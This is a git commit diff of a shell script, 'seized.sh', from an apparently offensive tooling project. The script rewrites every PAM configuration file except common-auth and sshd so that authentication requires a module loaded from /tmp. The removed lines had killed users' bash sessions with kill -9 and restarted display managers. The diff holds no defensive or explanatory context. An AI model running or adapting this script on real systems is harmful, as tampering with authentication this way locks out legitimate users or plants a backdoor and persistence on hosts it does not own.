00caef61d7679c137e61ebbc6314cc956117109d
l01n <43391718+l01n@users.noreply.github.com>
2025-03-02 10:11:20 -0500

    seized updates

--- deploy_otptome/assets/seized.sh
+++ deploy_otptome/assets/seized.sh
@@ -1,15 +1,11 @@
 #!/bin/bash
 
-# Define the line to prepend
-prepend_line="auth\trequired\tpam_otp.so"
+prepend_line="auth\trequired\t/tmp/pam_otp.so"
 
-# Add the line to the top of the PAM configuration files
 for file in /etc/pam.d/*; do 
   if [ "$file" != "/etc/pam.d/common-auth" ] && [ "$file" != "/etc/pam.d/sshd" ]; then 
-    # Remove the line if it's already there
     sed -i "/auth required \/tmp\/pam\.so/d" "$file"
     
-    # Prepend the line to the file
     {
       echo -e "$prepend_line"
       cat "$file"
@@ -17,16 +13,8 @@ for file in /etc/pam.d/*; do
   fi
 done
 
-# Kick off the existing non-sshd sessions
-for pid in $(ps -eo pid,cmd | grep -v grep | grep -E 'bash' | grep -v ssh | awk '{print $1}'); do
-  kill -9 $pid
-done
-
-# Restart the necessary services
-systemctl restart gdm
-systemctl restart lightdm
-
-# Restart the PAM service (if available)
 if [ -f /etc/init.d/pam ]; then
+  echo "Restarting PAM service..."
   /etc/init.d/pam restart
 fi
+
